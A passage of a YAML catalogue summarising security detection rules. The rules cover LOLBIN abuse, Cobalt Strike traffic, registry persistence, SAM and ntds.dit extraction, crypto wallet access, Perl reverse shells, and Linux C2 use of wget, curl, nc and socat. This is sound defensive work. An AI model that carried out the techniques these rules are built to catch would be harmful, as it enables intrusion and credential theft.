  Rule-Body-Hash: 0651eb38693c72a4f35933761cd232b6
  Ruleset: sigmahq
  Summary: This rule detects the execution of Cmdl32.exe with the "/vpn" and "/lan"
    flags, which attackers can exploit to download arbitrary files through a configuration
    file. Security teams should inspect the file's location and content passed as
    an argument to determine its legitimacy and identify potential threats.
  Updated-Date: '2024_09_04'
f37b4bce-49d0-4087-9f5b-58bffda77316:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7cb4457177ed2fd317a676c0355edba9
  Ruleset: core
  Summary: This rule detects attempts to tamper with autologger trace sessions on
    Windows systems. Autologger trace sessions are used for logging specific activities,
    and tampering with them is a technique employed by attackers to disable logging
    and obscure their malicious actions. The rule looks for specific modifications
    in the Windows registry under the path `\System\CurrentControlSet\Control\WMI\Autologger\`
    focusing on entries related to EventLog and Defender, particularly changes in
    the `Enable` and `Start` values. Such tampering is indicative of evasion tactics
    used by adversaries to avoid detection.
  Updated-Date: '2024_09_03'
f38a82d2-fba3-4781-b549-525efbec8506:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0160bf0f347d57916491d37ca32f8d71
  Ruleset: core
  Summary: This rule detects the execution of 3proxy, a lightweight and free proxy
    server, by monitoring process creation events in Windows. It specifically looks
    for instances where the executable file is "3proxy.exe" or where the process description
    corresponds to "3proxy - tiny proxy server." Additionally, the rule identifies
    command line parameters indicative of 3proxy usage, such as ".exe -i127.0.0.1
    -p." The detection aims to identify potentially malicious activities, particularly
    those associated with command-and-control mechanisms. While some legitimate administrative
    activities may trigger this detection, it is classified with a high level of concern.
  Updated-Date: '2024_09_03'
f38ce0b9-5e97-4b47-a211-7dc8d8b871da:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 60f0f817265b00cbaca1abc4a0ae7bd0
  Ruleset: core
  Summary: This rule detects the execution of Plink, an SSH client that can be used
    for tunneling, specifically targeting its activity for RDP tunneling. The detection
    focuses on identifying instances where Plink is used to forward traffic from local
    ports (127.0.0.1:3389) or configure remote communication ports such as 443 and
    22. This behavior is associated with attempts to perform data exfiltration and
    command-and-control activities through RDP tunneling, underscoring potential malicious
    use cases where Plink facilitates unauthorized remote access.
  Updated-Date: '2024_09_03'
f3a98ce4-6164-4dd4-867c-4d83de7eca51:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7262e5aed29e62da23eedd26e8ae34cc
  Ruleset: core
  Summary: This rule detects the TOKEN OBFUSCATION technique used by the Invoke-Obfuscation
    tool in PowerShell scripts. It focuses on identifying obfuscated script blocks
    that include irregular use of characters, such as backticks and concatenation
    methods, which are commonly used to evade detection. The rule examines the `ScriptBlockText`
    for specific patterns of obfuscation. Exceptions are made for legitimate scripts,
    including Chocolatey installation routines and Microsoft Exchange Server scripts,
    to reduce the likelihood of false positives.
  Updated-Date: '2024_09_03'
f3c89218-8c3d-4ba9-9974-f1d8e6a1b4a6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0cf6696b0057b6cac14c8bfab1899bbd
  Ruleset: core
  Summary: This rule detects obfuscated PowerShell scripts that utilize the VAR++
    LAUNCHER obfuscation technique. By searching for specific patterns in the payload,
    such as encoded variables and commands indicative of obfuscation, it identifies
    malicious usage intended to evade detection mechanisms. This method is often associated
    with attempts to bypass security defenses and execute harmful code on Windows
    systems using the PowerShell module.
  Updated-Date: '2024_09_03'
f3d39c45-de1a-4486-a687-ab126124f744:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a2efd30d7c105bfafb8be7b510df0928
  Ruleset: core
  Summary: This rule detects the execution of `sdiagnhost.exe` invoking a suspicious
    child process, which might indicate exploitation attempts of vulnerabilities such
    as Follina (CVE-2022-30190). The detection focuses on `sdiagnhost.exe` launching
    potentially malicious processes like `powershell.exe`, `cmd.exe`, `mshta.exe`,
    `cscript.exe`, `wscript.exe`, `taskkill.exe`, `regsvr32.exe`, `rundll32.exe`,
    and `calc.exe`. Filters are applied to exclude benign cases such as `cmd.exe`
    commands containing "bits" and certain `powershell.exe` executions with the `-noprofile`
    parameter. The severity level is classified as high due to the potential for misuse
    in exploiting security vulnerabilities.
  Updated-Date: '2024_09_03'
f3f21ce1-cdef-4bfc-8328-ed2e826f5fac:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bddc7284b674b793603863a3233514c7
  Ruleset: core
  Summary: This rule detects Cobalt Strike malleable profiles by identifying specific
    patterns in URIs, User-Agent headers, and HTTP methods. It looks for particular
    requests and headers indicative of Cobalt Strike's operations, such as certain
    User-Agent strings typically seen in malleable profiles and HTTP GET and POST
    methods directed at predefined URIs and hosts like www.amazon.com, ocsp.verisign.com,
    and onedrive.live.com. This detection helps recognize command-and-control communications
    and defense evasion techniques used by Cobalt Strike.
  Updated-Date: '2024_09_03'
f40017b3-cb2e-4335-ab5d-3babf679c1de:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ba748f004bad9b132239b1bcd0125a3a
  Ruleset: sigmahq
  Summary: This rule detects a remote DLL load event executed via "rundll32.exe" on
    Windows systems. The rule identifies instances where the "rundll32.exe" process
    loads a DLL from a network path, indicated by the DLL's path starting with "\\".
    This behavior can be indicative of an attempt to execute potentially malicious
    or unauthorized code from a remote location.
  Updated-Date: '2024_09_04'
f41b0311-44f9-44f0-816d-dd45e39d4bc8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8be5f8cc6c946dbc4d82177a89987422
  Ruleset: sigmahq
  Summary: This rule detects file access requests to cryptocurrency wallet files by
    uncommon processes on Windows systems. It identifies attempts to access files
    associated with various cryptocurrency wallets stored in directories such as Ethereum,
    EthereumClassic, and Monero keystores, as well as Bitcoin, BitcoinABC, BitcoinSV,
    DashCore, DogeCoin, Litecoin, Ripple, and Zcash wallet files. The detection is
    filtered to exclude common system and legitimate software directories to reduce
    false positives, potentially indicating attempts at cryptocurrency wallet theft.
  Updated-Date: '2024_09_04'
f41dada5-3f56-4232-8503-3fb7f9cf2d60:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 894d60827e3811287dbd76f4d1d5a198
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "esxcli" command with the "storage"
    flag, which is used to gather information about storage status and other related
    details in VMware ESXi environments. Such activity has been observed in malware
    operations conducted by DarkSide and LockBit, which target virtualized environments.
  Updated-Date: '2024_09_04'
f425637f-891c-4191-a6c4-3bb1b70513b4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4b88b7b33157c6051c2512845c905d82
  Ruleset: emerging-threats
  Summary: This rule detects an attempted exploitation of CVE-2021-22123, which targets
    Fortinet Web Application Firewalls (WAFs). The exploitation involves a specific
    API request (`/api/v2.0/user/remoteserver.saml`) using the POST method, while
    ensuring the referrer does not match certain patterns indicative of benign activity.
    This vulnerability can allow an attacker to perform OS command injections on the
    affected systems.
  Updated-Date: '2024_09_03'
f4264e47-f522-4c38-a420-04525d5b880f:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b3b833764c75a02481e33b98e45fa96d
  Ruleset: core
  Summary: This rule detects the execution of a renamed AutoIt2.exe or AutoIt3.exe,
    which is indicative of potentially malicious activity. AutoIt is a scripting language
    and automation tool used primarily for legitimate automation tasks on Windows
    systems. However, attackers can exploit AutoIt to create and distribute malware
    such as keyloggers, spyware, and botnets. A renamed AutoIt executable is particularly
    suspicious and warrants attention, as it may signify an attempt to evade detection
    by security measures.
  Updated-Date: '2024_09_03'
f426547a-e0f7-441a-b63e-854ac5bdf54d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 878c98fad02c4e1db5581fa8e465ba5a
  Ruleset: sigmahq
  Summary: This rule detects the execution of Perl using the "-e" or "-E" flags, which
    can indicate the execution of live Perl code or the launch of a reverse shell.
    Perl is a high-level, general-purpose programming language, and these flags facilitate
    inline code execution. Monitoring for such activity can help identify potentially
    malicious actions where Perl scripts are used for unauthorized system access or
    other harmful purposes.
  Updated-Date: '2024_09_04'
f43f5d2f-3f2a-4cc8-b1af-81fde7dbaf0e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 525ac376889c579c564b4417e7f962f3
  Ruleset: sigmahq
  Summary: This rule detects suspicious SAML activity in AWS, indicating potential
    adversarial actions to gain backdoor access. Specifically, it monitors for the
    'AssumeRoleWithSAML' event from the 'sts.amazonaws.com' service and the 'UpdateSAMLProvider'
    event from the 'iam.amazonaws.com' service. These events, if occurring under unusual
    circumstances, may indicate that an attacker is attempting to exploit SAML for
    unauthorized access, privilege escalation, or lateral movement within the AWS
    environment.
  Updated-Date: '2024_09_04'
f44800ac-38ec-471f-936e-3fa7d9c53100:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3169fdc9e2b2727f8e8703a205c4465c
  Ruleset: core
  Summary: 'This rule detects the execution of CleanWipe, a tool typically used to
    remove Symantec antivirus software. The detection focuses on specific executable
    files associated with CleanWipe: ''SepRemovalToolNative_x64.exe'', ''CATClean.exe''
    with the ''--uninstall'' command, ''NetInstaller.exe'' with the ''-r'' command,
    and ''WFPUnins.exe'' with both ''/uninstall'' and ''/enterprise'' commands. The
    rule is potentially triggered by legitimate administrative usage, which warrants
    investigation nonetheless.'
  Updated-Date: '2024_09_03'
f48f5368-355c-4a1b-8bf5-11c13d589eaa:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4c0d4b22694a4bc548f91036c7518085
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts of CVE-2023-43261 and potential
    information disclosure in specific Milesight router models (UR5X, UR32L, UR32,
    UR35, UR41) that are running firmware versions prior to v35.3.0.7. The exploitation
    allows attackers to access sensitive components of the router, as seen in proxy
    logs where an HTTP GET request targets the "/lang/log/httpd.log" path and returns
    a status code of 200, indicating successful access.
  Updated-Date: '2024_09_03'
f4a623c2-4ef5-4c33-b811-0642f702c9f1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: af700a2f731ca03abd1343feeaa40262
  Ruleset: sigmahq
  Summary: This rule detects the execution of a shell, such as PowerShell, bash, or
    WSL, initiated via a Visual Studio Code tunnel. Attackers may exploit this feature
    to create a command-and-control (C2) channel and run arbitrary commands on a system.
    The rule identifies specific parent and child process relationships involving
    Visual Studio Code's server components and various shell executables to flag suspicious
    activity that could indicate an unauthorized C2 setup.
  Updated-Date: '2024_09_04'
f50f3c09-557d-492d-81db-9064a8d4e211:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cba08a73e833b25909f8b9634adb0470
  Ruleset: core
  Summary: This rule detects the creation of the "accepteula" registry key related
    to Sysinternals tools when these tools are launched from executables with incorrect
    names. The Sysinternals suite includes utilities for advanced system analysis,
    diagnostics, and troubleshooting, such as Active Directory Explorer, Handle, LiveKd,
    ProcDump, Process Explorer, PsExec, PsLoggedon, PsLoglist, PsPasswd, PsPing, PsService,
    and SDelete. The rule monitors specific registry paths and checks that the involved
    executables' names match the standard Sysinternals naming conventions to identify
    suspicious activities potentially indicating malware evasion techniques.
  Updated-Date: '2024_09_03'
f53714ec-5077-420e-ad20-907ff9bb2958:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f8ebc5ac20ea3ff70cbf7e18d55ccf87
  Ruleset: sigmahq
  Summary: This rule detects the execution of "forfiles.exe" from a non-default location,
    aiming to identify potential masquerading attempts where a custom "cmd.exe" is
    spawned from the current working directory. Specifically, this involves observing
    the creation of child processes by "forfiles.exe" that are named "cmd.exe" and
    whose command line starts with "/c echo," which are characteristics hardcoded
    in the original "forfiles.exe" binary. The rule filters out instances where "forfiles.exe"
    and "cmd.exe" originate from the legitimate system directories (\Windows\System32\
    or \Windows\SysWOW64\). The detection focuses on cases where the parent process
    does not include any command-line options. The goal is to highlight potential
    defense evasion techniques where attackers exploit the "forfiles.exe" utility
    to execute obfuscated commands.
  Updated-Date: '2024_09_04'
f548a603-c9f2-4c89-b511-b089f7e94549:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b66d4ddf2cfaf5191ac47ace5cf33393
  Ruleset: sigmahq
  Summary: This rule detects the manual execution of the "Microsoft Compatibility
    Appraiser" task via the 'schtasks' command. Specifically, it identifies an attempt
    to trigger persistence mechanisms stored in the "\AppCompatFlags\TelemetryController"
    registry key. This method can be abused to maintain persistence on a system, highlighting
    its significance in unauthorized activities.
  Updated-Date: '2024_09_04'
f576a613-2392-4067-9d1a-9345fb58d8d1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 74430ccca997647d63311df400261fe0
  Ruleset: sigmahq
  Summary: This rule detects the use of automated techniques within a Windows system
    or network for collecting internal data. It focuses on the execution of command-line
    operations involving common document file types (e.g., .doc, .docx, .xls, .xlsx,
    .ppt, .pptx, .rtf, .pdf, .txt) and specific command patterns that include 'dir'
    and 'findstr' commands. These patterns suggest that an adversary may be systematically
    searching and listing files across the system.
  Updated-Date: '2024_09_04'
f57c58b3-ee69-4ef5-9041-455bf39aaa89:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a57f3a629ce4bc207d0d7af5c9b4aef0
  Ruleset: sigmahq
  Summary: This rule detects the usage of "hh.exe" to execute or download remotely
    hosted ".chm" files, typically to identify potential malicious activities or abuses
    of the HTML Help executable for defense evasion purposes on Windows systems.
  Updated-Date: '2024_09_04'
f57f8d16-1f39-4dcb-a604-6c73d9b54b3d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75b6c91a81f6f9503d19ec151474c435
  Ruleset: core
  Summary: This rule detects a command that accesses the VolumeShadowCopy to extract
    sensitive files such as the Security or SAM registry hives or the Active Directory
    database (ntds.dit).
  Updated-Date: '2024_09_03'
f598ea0c-c25a-4f72-a219-50c44411c791:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5df0c82d32d8f67325c013666c43d19b
  Ruleset: core
  Summary: This rule detects the possible addition of shadow credentials to an Active
    Directory object. It focuses on identifying events where the `msDS-KeyCredentialLink`
    attribute is modified, which could indicate unauthorized credential linkage. These
    modifications are typically logged under event ID 5136 within the security audit
    logs. Shadow credentials are a method used by attackers to gain covert access
    to victim systems by adding hidden credentials to an AD object. Although modifications
    by legitimate services like Azure AD Connect synchronization or ADFS service accounts
    can occur, these should be excluded to reduce false positives.
  Updated-Date: '2024_09_03'
f59c3faf-50f3-464b-9f4c-1b67ab512d99:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: efd862b8168174d90a5aa7c0115dee91
  Ruleset: sigmahq
  Summary: This rule detects modifications to commonly used autorun keys within the
    Windows registry, which are often targeted by attackers to establish persistence
    on a system. The specific registry keys monitored include those related to autostart
    functionalities in Windows CE Services, command processors, installed components,
    protocols, HTML file handlers, user initialization scripts, control panel settings,
    Internet Explorer settings, and desktop components. Changes to these keys can
    indicate unauthorized attempts to run malicious software automatically upon system
    boot or user logon. The rule incorporates filters to exclude changes related to
    Microsoft Office, Google Chrome, Microsoft Edge, Internet Explorer installations,
    and certain system processes to reduce false positives.
  Updated-Date: '2024_09_04'
f5d19838-41b5-476c-98d8-ba8af4929ee2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fd3a4ea1e4b433cf79018878629b2c18
  Ruleset: core
  Summary: This rule detects a suspicious activity involving the copying of a known
    living-off-the-land binary (LOLBIN) from system directories such as System32,
    SysWOW64, or WinSxS to another location on the disk. This is done to evade security
    detections tied to specific locations. The detection triggers when command line
    utilities like cmd.exe, PowerShell, pwsh.exe, robocopy.exe, or xcopy.exe execute
    copy operations involving common LOLBINs like bitsadmin.exe, calc.exe, certutil.exe,
    cmdl32.exe, cscript.exe, mshta.exe, rundll32.exe, or wscript.exe from these critical
    directories.
  Updated-Date: '2024_09_03'
f5d1def8-1de0-4a0e-9794-1f6f27dd605c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: feaa5cf1bdbf9cbe65e87110811c087f
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell scripts that call "Win32_QuickFixEngineering"
    to enumerate installed hotfixes. This activity is commonly observed in enumeration
    scripts used by attackers to gather information about installed updates on a system.
    The specific properties targeted involve querying for details like 'HotFixID',
    which could be part of a larger reconnaissance effort. It should be noted that
    legitimate administrative scripts might also perform similar actions.
  Updated-Date: '2024_09_04'
f5e3b62f-e577-4e59-931e-0a15b2b94e1e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 14c76844fa5b61bb5d19c4bcc0a6121e
  Ruleset: core
  Summary: This rule detects the execution of specific executable names or command
    line flags associated with Htran and NATBypass, which are tools utilized to maintain
    command-and-control channels by bypassing network address translation (NAT). Htran
    is detailed in repositories such as GitHub, and this detection rule focuses on
    instances where executables like "htran.exe" or "lcx.exe" are launched, as well
    as command-line arguments that include certain parameters typically used by these
    tools.
  Updated-Date: '2024_09_03'
f62176f3-8128-4faa-bf6c-83261322e5eb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e170be541eb9d5dc6a7bb646925f975a
  Ruleset: sigmahq
  Summary: This rule detects the use of specific keywords associated with well-known
    PowerShell exploitation frameworks in script block logging on Windows systems.
    These keywords, such as 'AdjustTokenPrivileges', 'IMAGE_NT_OPTIONAL_HDR64_MAGIC',
    'Metasploit', 'Microsoft.Win32.UnsafeNativeMethods', 'Mimikatz', 'MiniDumpWriteDump',
    'PAGE_EXECUTE_READ', 'ReadProcessMemory.Invoke', 'SE_PRIVILEGE_ENABLED', 'SECURITY_DELEGATION',
    'TOKEN_ADJUST_PRIVILEGES', 'TOKEN_ALL_ACCESS', 'TOKEN_ASSIGN_PRIMARY', 'TOKEN_DUPLICATE',
    'TOKEN_ELEVATION', 'TOKEN_IMPERSONATE', 'TOKEN_INFORMATION_CLASS', and 'TOKEN_PRIVILEGES'
    are typically indicative of malicious activities. The detection relies on Script
    Block Logging being enabled and may require tuning to minimize false positives
    depending on the specific environment's usage of PowerShell scripts.
  Updated-Date: '2024_09_04'
f63508a0-c809-4435-b3be-ed819394d612:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c9f0c73dffcac85aefd6eba0c4d5a95e
  Ruleset: sigmahq
  Summary: This rule detects the usage of the 'SeLoadDriverPrivilege' privilege, which
    allows a user to dynamically load and unload device drivers or other code into
    kernel mode but does not apply to Plug and Play device drivers. The rule can identify
    unauthorized attempts to load malicious kernel drivers if privileged users and
    processes are excluded. It can detect tools like Ghost-In-The-Logs and Sysinternals,
    necessitating the use of a whitelist to filter out legitimate activities.
  Updated-Date: '2024_09_04'
f63b56ee-3f79-4b8a-97fb-5c48007e8573:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 383ae35e5ddd82956430c49c276cb5d5
  Ruleset: core
  Summary: This rule detects the installation of a DNS plugin DLL via the ServerLevelPluginDll
    parameter in the registry. This can be used to execute code in the context of
    the DNS server, necessitating a server restart. The detection focuses on the `dnscmd.exe`
    process with specific command-line parameters related to configuring server-level
    plugins.
  Updated-Date: '2024_09_03'
f6451de4-df0a-41fa-8d72-b39f54a08db5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0e5b3c09e1f1d85ba2520a93f0bbec07
  Ruleset: sigmahq
  Summary: This rule detects instances where the default named pipe used by PAExec
    is created. PAExec is an open-source alternative to Microsoft's PsExec, which
    is used for executing processes on remote systems. The detection focuses on named
    pipes that start with '\PAExec', indicating potential remote process execution
    or administration activity. The rule helps in identifying unauthorized or suspicious
    usage of PAExec, which could be indicative of lateral movement or administrative
    actions in a network.
  Updated-Date: '2024_09_04'
f64b6e9a-5d9d-48a5-8289-e1dd2b3876e1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 65340037f352e57439cc93eff6e47fd5
  Ruleset: sigmahq
  Summary: This rule detects suspicious entries in Linux log files that may indicate
    potentially malicious or abnormal activities. Such log entries include terms like
    "entered promiscuous mode," which can signify network interface changes to monitor
    all traffic, "Deactivating service," indicating unexpected service stoppage, "Oversized
    packet received from," potentially pointing to network attacks, and "imuxsock
    begins to drop messages," which could suggest log overflow or manipulation.
  Updated-Date: '2024_09_04'
f64c9b2d-b0ad-481d-9d03-7fc75020892a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 35fe50958cd1b5772c0c19fcb258c4d5
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading of "roboform.dll" or "roboform-x64.dll,"
    which are DLL files used by RoboForm Password Manager. Sideloading is identified
    by monitoring the loading of these specific DLLs, except when the loading process
    originates from legitimate paths like "C:\Program Files (x86)\Siber Systems\AI
    RoboForm\" or "C:\Program Files\Siber Systems\AI RoboForm\" in combination with
    "robotaskbaricon.exe" or "robotaskbaricon-x64.exe." The rule is designed to alert
    users of potential defense evasion and privilege escalation activities in a Windows
    environment.
  Updated-Date: '2024_09_04'
f64e5c19-879c-4bae-b471-6d84c8339677:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8cdb754de7b824a8af058813135cfb31
  Ruleset: core
  Summary: This rule detects processes initiated by web servers such as PHP, Tomcat,
    and IIS that attempt to perform reconnaissance by probing for the presence of
    popular scripting tools like Perl, Python, and wget on the system using help commands.
    The activity is identified by analyzing process creation logs where the parent
    image matches common web server executables or has characteristics indicating
    Tomcat-specific processes. The detection criteria are based on command lines that
    check for help options of the scripting tools. This behavior is indicative of
    reconnaissance efforts potentially related to the use of webshells.
  Updated-Date: '2024_09_03'
f65e22f9-819e-4f96-9c7b-498364ae7a25:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1d8154cc14190839b1bf7f9a9ef400fd
  Ruleset: core
  Summary: This rule detects the creation of a PowerShell module where the module's
    contents are configured to include the function `Get-VMRemoteFXPhysicalVideoAdapter`.
    This could indicate potential abuse of the "RemoteFXvGPUDisablement.exe" binary,
    which is known to be vulnerable to module load-order hijacking, a technique that
    could be utilized for malicious purposes.
  Updated-Date: '2024_09_03'
f663a6d9-9d1b-49b8-b2b1-0637914d199a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f4d9095de0361e37e64d5b6caf9488ab
  Ruleset: core
  Summary: This rule detects the exploitation of Windows 10 Narrator's Feedback-Hub
    for persistence by observing specific changes in registry events. It monitors
    for deletions of values and modifications to particular registry paths indicating
    potential misuse. This activity could be related to an attack tactic aimed at
    maintaining persistence on a compromised system.
  Updated-Date: '2024_09_03'
f674e36a-4b91-431e-8aef-f8a96c2aca35:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6f8f8b144a3e08c31ebea6aa8b56baac
  Ruleset: sigmahq
  Summary: This rule detects modifications to autorun keys within the registry under
    the CurrentControlSet path, which signifies potential unauthorized changes to
    autostart extensibility points (ASEP). These registry paths include those associated
    with Terminal Server configurations, security providers, SafeBoot, print monitors,
    network providers, and LSA authentication packages. Monitoring these changes can
    help identify attempts at persistence techniques often employed by malware to
    execute automatically during system startup. Specific filters are in place to
    exclude known legitimate software such as CutePDF, Microsoft OneNote, and RealVNC,
    ensuring the rule focuses on suspicious modifications.
  Updated-Date: '2024_09_04'
f68c4a4f-19ef-4817-952c-50dce331f4b0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 88e9a1cc626ee557b95dac77accb1b6b
  Ruleset: core
  Summary: This rule detects the execution traces of the WizardUpdate malware on macOS
    systems. WizardUpdate is a macOS trojan known for attempting to infiltrate macOS
    machines to steal data. It is associated with the deployment of other malicious
    payloads, thereby increasing the likelihood of multiple infections on the affected
    device.
  Updated-Date: '2024_09_03'
f6a711f3-d032-4f9e-890b-bbe776236c84:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3719bb5316ce1e52092a7d3c283f310e
  Ruleset: emerging-threats
  Summary: This rule detects the execution of specific named binaries, such as '/BarracudaMailService',
    '/resize2fstab', and '/resize_reisertab,' which are associated with the deployment
    of the SEASPY backdoor by the threat group UNC4841. This behavior is identified
    through process creation logs on Linux systems and is characterized by a low likelihood
    of false positives, indicating a critical level of threat when such binaries are
    observed.
  Updated-Date: '2024_09_03'
f6c68d5f-e101-4b86-8c84-7d96851fd65c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a64741006eef9c0fec6a9fefab77c378
  Ruleset: core
  Summary: This rule detects a threat actor creating a file named `wbemcomn.dll` in
    the `C:\Windows\System32\wbem\` directory over the network, which is indicative
    of a WMI DLL Hijack scenario.
  Updated-Date: '2024_09_03'
f6d1dd2f-b8ce-40ca-bc23-062efb686b34:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: accf323fd3057d1f97adb77e7bd8c42f
  Ruleset: core
  Summary: This rule detects a suspicious activity where the Script Event Consumer
    process (scrcons.exe) spawns a child process, such as svchost.exe, dllhost.exe,
    powershell.exe, pwsh.exe, wscript.exe, cscript.exe, schtasks.exe, regsvr32.exe,
    mshta.exe, rundll32.exe, msiexec.exe, or msbuild.exe. This behavior is considered
    unusual and may indicate malicious activity, particularly in the context of process
    creation on Windows systems. The rule captures key details like the command line
    and parent command line to aid in identifying potentially harmful actions.
  Updated-Date: '2024_09_03'
f6de6525-4509-495a-8a82-1f8b0ed73a00:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 725d6b8de6012e674526e0d686bb5cf1
  Ruleset: sigmahq
  Summary: This rule detects the creation of remote tasks via the ATSVC named pipe
    using the `at.exe` command or related API calls on a Windows system. It identifies
    this activity through Security event ID 5145, specifically monitoring for access
    to the IPC$ share and writes to the ATSVC object. Such behaviors can indicate
    lateral movement or persistence mechanisms used by attackers.
  Updated-Date: '2024_09_04'
f6de9536-0441-4b3f-a646-f4e00f300ffd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8ee432b9105a2c127d06528925099416
  Ruleset: core
  Summary: This rule detects scenarios where weak encryption is enabled for a user
    profile, which may be exploited for hash or password cracking. It focuses on monitoring
    specific changes in user account properties by looking at particular flag values
    in event logs, indicating whether certain encryption settings have changed, such
    as DES, pre-authentication required, or storage of encrypted text passwords.
  Updated-Date: '2024_09_03'
f6ecd1cf-19b8-4488-97f6-00f0924991a3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 26b21c1a73d41a884b82e275150a6ccb
  Ruleset: sigmahq
  Summary: This rule detects the execution of Nmap or Zenmap, which are tools often
    used for network discovery and security auditing. Adversaries may use these tools
    to enumerate services running on remote hosts, potentially identifying vulnerabilities
    for remote software exploitation.
  Updated-Date: '2024_09_04'
f7158a64-6204-4d6d-868a-6e6378b467e0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 710fa4be29c1bdb6322f9a94e347e8fe
  Ruleset: sigmahq
  Summary: This rule detects suspicious command and control (C2) activities on Linux
    systems monitored by the Auditd service. It identifies the usage of specific commands
    known to be associated with malicious actions, such as wget, curl, base64, nc,
    netcat, ncat, ssh, socat, wireshark, rawshark, rdesktop, and nmap. These commands
    align with various tactics used in C2 operations, including Application Layer
    Protocol, Non-Application Layer Protocol, and Data Encoding, indicating potential
    unauthorized or malicious activities.
  Updated-Date: '2024_09_04'
f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 487a79fe2857a13f71e8a06d7df7c6a7
  Ruleset: core
  Summary: This rule detects a suspicious RDP session redirection that involves the
    usage of tscon.exe, indicating a possible lateral movement or unauthorized session
    takeover within a Windows environment. TSCON, a command-line utility, can be exploited
    for RDP hijacking, where an attacker transparently transfers an active RDP session
    to another machine.
  Updated-Date: '2024_09_03'
f7375e28-5c14-432f-b8d1-1db26c832df3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3ca5604ab2fb2e27f8b015acb1dd9ffa
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading activities that exploit the
    Microsoft Office Word application (winword.exe). The detection focuses on the
    use of the '/l' command-line flag in conjunction with DLL files, indicating an
    attempt to load an arbitrary DLL through the WinWord process. This method can
    be leveraged for defense evasion, as it may allow malicious actors to execute
    unauthorized code within the context of a trusted application.
  Updated-Date: '2024_09_04'
f7385ee2-0e0c-11eb-adc1-0242ac120002:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1760554173be3bd975fafd0a56161e0d
  Ruleset: core
